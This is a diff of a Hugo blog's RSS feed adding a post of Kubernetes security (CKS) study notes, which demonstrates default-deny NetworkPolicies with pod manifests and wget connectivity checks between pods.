@@ -6,7 +6,731 @@
     <description>Recent content in Posts on My New Hugo Site</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 25 Jan 2019 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/newblog/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 23 Aug 2024 23:17:59 +0100</lastBuildDate><atom:link href="http://localhost:1313/newblog/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CKS</title>
+      <link>http://localhost:1313/newblog/posts/cks/</link>
+      <pubDate>Fri, 23 Aug 2024 23:17:59 +0100</pubDate>
+      
+      <guid>http://localhost:1313/newblog/posts/cks/</guid>
+      <description>[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]] [[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]] [[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]] [[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]] [[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]] [[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]] [[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]] [[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]] [[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]] [[#Protecting GUI Elements|Protecting GUI Elements]] [[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]] [[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]] [[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]] [[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]] [[#Summary|Summary]] - [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]] - [[#Avoiding Insecure Configuration Arguments#Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities|Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]] !</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]]
+&lt;ul&gt;
+&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]]&lt;/li&gt;
+&lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;[[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]]&lt;/li&gt;
+&lt;li&gt;[[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]]
+&lt;ul&gt;
+&lt;li&gt;[[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]]&lt;/li&gt;
+&lt;li&gt;[[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]]&lt;/li&gt;
+&lt;li&gt;[[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]]&lt;/li&gt;
+&lt;li&gt;[[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]]
+&lt;ul&gt;
+&lt;li&gt;[[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;[[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]]&lt;/li&gt;
+&lt;li&gt;[[#Protecting GUI Elements|Protecting GUI Elements]]
+&lt;ul&gt;
+&lt;li&gt;[[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]]&lt;/li&gt;
+&lt;li&gt;[[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]]&lt;/li&gt;
+&lt;li&gt;[[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;[[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]]&lt;/li&gt;
+&lt;li&gt;[[#Summary|Summary]]
+- [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]]
+- [[#Avoiding Insecure Configuration Arguments#Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities|Practice the Use of &lt;code&gt;kube-bench&lt;/code&gt; to Detect Cluster Component Vulnerabilities]]
+- [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]]
+- [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]]
+- [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-17 192014.png]]&lt;/p&gt;
+&lt;h2 id=&#34;using-network-policies-to-restrict-pod-to-pod-communication&#34;&gt;Using Network Policies to Restrict Pod-to-Pod Communication&lt;/h2&gt;
+&lt;p&gt;For a Microservice architecture to function in Kubernetes, a Pod needs to be able to communicate with another pod running on same or different node without NAT. Kubernetes assign IP to a pod upon creation from the pod CIDR range of its node, the IP is ephemeral (not stable overtime), every restart of a pod leases a new IP Address.
+It&amp;rsquo;s recommended to use Pod-to-Service Communication over Pod-to-Pod communication so that you can rely on a consistent Network Interface.&lt;/p&gt;
+&lt;p&gt;The IP of a pod is unique across different nodes and namespaces. This is achieved by assigning a dedicated subnet to every node when registering it.&lt;/p&gt;
+&lt;p&gt;Newly created pod will then get an ip from the subnet of the node, this is handled by CNI plugin&lt;/p&gt;
+&lt;p&gt;Pods on a node can communicate with all other pods running on any other node of the cluster.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://networkpolicy.io/&#34;&gt;https://networkpolicy.io/&lt;/a&gt; : Provide a visual editor for network policies that renders a graphical representation in the browser&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;attacker-gain-initial-access-to-a-pod&#34;&gt;Attacker gain initial access to a Pod&lt;/h3&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-17 193605.png]]&lt;/p&gt;
+&lt;p&gt;Without defining Network Policies, Attacker can talk to all pods and cause additional damage.&lt;/p&gt;
+&lt;h3 id=&#34;denying-directional-network-traffic&#34;&gt;Denying Directional Network Traffic&lt;/h3&gt;
+&lt;p&gt;The best way to restrict Pod-to-Pod network traffic is with the principle of least privilege&lt;/p&gt;
+&lt;p&gt;Setup the cluster on &lt;code&gt;ng04.yml&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Namespace&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;orion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bmuschko/nodejs-hello-world:1.0.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;hello&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;containerPort&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;alpine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;/bin/sh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - -&lt;span style=&#34;color:#ae81ff&#34;&gt;c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;while true; do sleep 5; done;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Pod&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;outside&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;other&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;alpine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;other&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;/bin/sh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - -&lt;span style=&#34;color:#ae81ff&#34;&gt;c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;while true; do sleep 5; done;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;restartPolicy&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Never&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f ng04.yml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Verify that the pods are up and running:&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 222913.png]]&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 222953.png]]&lt;/p&gt;
+&lt;p&gt;The cluster have 2 pods on g04 namespace and a pod on default namespace.
+By default communication is allowed between these pods, even though the namespace is different.&lt;/p&gt;
+&lt;p&gt;To test the connectivity from frontend to backend:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec frontend -it -n g04 -- /bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote file exists
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;same applies from other to backend:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec other -it -- /bin/sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;remote file exists 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s now apply the default deny all ingress traffic policy.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-deny-all&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;podSelector&lt;/span&gt;: {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;policyTypes&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;Ingress&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Selecting all Pods is denoted by the value &lt;code&gt;{}&lt;/code&gt; assigned to the &lt;code&gt;spec.podSelector&lt;/code&gt; attribute. The value attribute &lt;code&gt;spec.policyTypes&lt;/code&gt; defines the denied direction of traffic. For incoming traffic, you can add &lt;em&gt;Ingress&lt;/em&gt; to the array. Outgoing traffic can be specified by the value &lt;em&gt;Egress&lt;/em&gt;. In this particular example, we disallow all ingress traffic. Egress traffic is still permitted.&lt;/p&gt;
+&lt;p&gt;You’d usually start by disallowing traffic in any direction and then opening up the traffic needed by the application architecture.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f deny-all-ingress-network-policy.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;networkpolicy.networking.k8s.io/default-deny-ingress created
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Pod-to-pod connectivity is now denied:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec frontend -it -n g04 -- /bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget: download timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
